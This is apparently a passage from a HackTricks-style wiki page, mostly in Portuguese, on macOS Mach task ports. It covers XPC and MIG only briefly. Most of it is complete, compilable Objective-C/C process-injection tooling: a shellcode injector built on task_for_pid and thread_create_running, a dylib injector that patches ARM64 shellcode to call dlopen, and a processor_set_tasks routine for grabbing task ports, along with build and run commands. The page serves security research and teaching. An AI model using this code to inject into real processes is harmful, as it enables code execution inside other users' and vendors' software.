Qualquer thread pode obter esta porta chamando **`mach_thread_sef`**.

### Injeção de Shellcode em thread via Porta de Tarefa

Você pode pegar um shellcode de:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** o programa anterior e adicione as **entitlements** para poder injetar código com o mesmo usuário (caso contrário, você precisará usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Para que isso funcione no iOS, você precisa da permissão `dynamic-codesigning` para poder criar um executável de memória gravável.

### Injeção de Dylib em thread via porta de Tarefa

No macOS, **threads** podem ser manipuladas via **Mach** ou usando a **api posix `pthread`**. A thread que geramos na injeção anterior foi gerada usando a api Mach, então **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque **não precisava funcionar com apis** compatíveis com posix, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar a thread**, ela deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Então, esse novo pthread poderia **chamar dlopen** para **carregar um dylib** do sistema, assim, em vez de escrever um novo shellcode para realizar diferentes ações, é possível carregar bibliotecas personalizadas.

Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um log e depois você pode ouvi-lo):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Sequestro de Thread via Porta de Tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Nesta técnica, uma thread do processo é sequestrada:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Detecção de Injeção de Porta de Tarefa

Ao chamar `task_for_pid` ou `thread_create_*`, um contador na estrutura de tarefa do kernel é incrementado, que pode ser acessado do modo usuário chamando task_info(task, TASK_EXTMOD_INFO, ...)

## Portas de Exceção

Quando uma exceção ocorre em uma thread, essa exceção é enviada para a porta de exceção designada da thread. Se a thread não a manipular, então é enviada para as portas de exceção da tarefa. Se a tarefa não a manipular, então é enviada para a porta do host, que é gerenciada pelo launchd (onde será reconhecida). Isso é chamado de triagem de exceção.

Note que, no final, geralmente, se não for manipulada corretamente, o relatório acabará sendo tratado pelo daemon ReportCrash. No entanto, é possível que outra thread na mesma tarefa gerencie a exceção, isso é o que ferramentas de relatório de falhas como `PLCreashReporter` fazem.

## Outros Objetos

### Relógio

Qualquer usuário pode acessar informações sobre o relógio, no entanto, para definir a hora ou modificar outras configurações, é necessário ser root.

Para obter informações, é possível chamar funções do subsistema `clock`, como: `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Para modificar valores, o subsistema `clock_priv` pode ser usado com funções como `clock_set_time` e `clock_set_attributes`

### Processadores e Conjunto de Processadores

As APIs de processador permitem controlar um único processador lógico chamando funções como `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Além disso, as APIs de **conjunto de processadores** fornecem uma maneira de agrupar múltiplos processadores em um grupo. É possível recuperar o conjunto de processadores padrão chamando **`processor_set_default`**.\
Estas são algumas APIs interessantes para interagir com o conjunto de processadores:

- `processor_set_statistics`
- `processor_set_tasks`: Retorna um array de direitos de envio para todas as tarefas dentro do conjunto de processadores
- `processor_set_threads`: Retorna um array de direitos de envio para todas as threads dentro do conjunto de processadores
- `processor_set_stack_usage`
- `processor_set_info`

Como mencionado em [**este post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), no passado isso permitia contornar a proteção mencionada anteriormente para obter portas de tarefa em outros processos para controlá-los chamando **`processor_set_tasks`** e obtendo uma porta de host em cada processo.\
Hoje em dia, você precisa ser root para usar essa função e isso é protegido, então você só poderá obter essas portas em processos não protegidos.

Você pode tentar com:

<details>

<summary><strong>código processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
